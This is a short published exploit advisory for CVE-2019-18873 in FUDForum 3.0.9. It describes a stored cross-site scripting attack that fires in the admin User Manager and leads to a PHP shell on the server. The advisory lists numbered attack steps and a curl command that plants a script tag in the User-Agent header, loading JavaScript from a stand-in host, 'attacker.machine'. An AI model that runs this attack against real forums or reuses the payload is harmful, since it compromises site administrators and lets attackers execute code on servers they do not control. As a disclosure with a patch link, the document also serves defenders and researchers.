# FUDForum 3.0.9 - Stored XSS / Remote Code Execution [Admin Panel]

- Date                  : 10/26/19
- Exploit Author        : liquidsky (JMcPeters)
- Vulnerable Software   : FUDForum 3.0.9
- Version               : 3.0.9
- Software Link         : https://sourceforge.net/projects/fudforum/files/FUDforum_3.0.9.zip/download
- Tested On             : Windows / mysql / apache
- Author Site           : http://incidentsecurity.com | demo: https://youtu.be/0gsJQ82TXw4
- CVE                   : CVE-2019-18873
- Patch / Fix           : https://sourceforge.net/p/fudforum/code/6321/

Greetz : wetw0rk, Fr13ndz, offsec

Description: FUDForum 3.0.9 is vulnerable to Stored XSS via the User-Agent HTTP header. This may result in remote code execution. An attacker can use a user account to fully compromise the system via a GET request. When the admin visits user information under "User Manager" in the control panel, the payload will execute. This will allow for PHP files to be written to the web root, and for code to execute on the remote server. The problem is in admsession.php and admuser.php.

Notes: 

1. Register an account and log in to the forum. If you have an IP already associated with a registered user this is not required.
   This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.

2. Send the XSS payload below (from an IP associated with an account) / host the script:

- curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php

3. When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
